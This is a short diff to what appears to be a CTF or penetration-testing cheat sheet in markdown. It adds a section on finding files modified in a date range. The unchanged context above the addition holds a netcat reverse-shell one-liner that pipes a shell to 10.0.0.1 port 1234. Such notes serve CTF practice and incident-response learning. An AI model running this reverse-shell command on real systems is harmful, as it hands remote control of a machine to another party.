@@ -104,5 +104,13 @@ for example:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f &
 ```
 
+## Modification of Files \(CTF specific / IR trick\)
 
+look for other files modified after initial flag file or other indicator
+
+```
+find / -type f -newermt 2017-08-20 ! -newermt 2017-08-24
+```
+
+above example the user flag was uploaded aug 22 2017
 
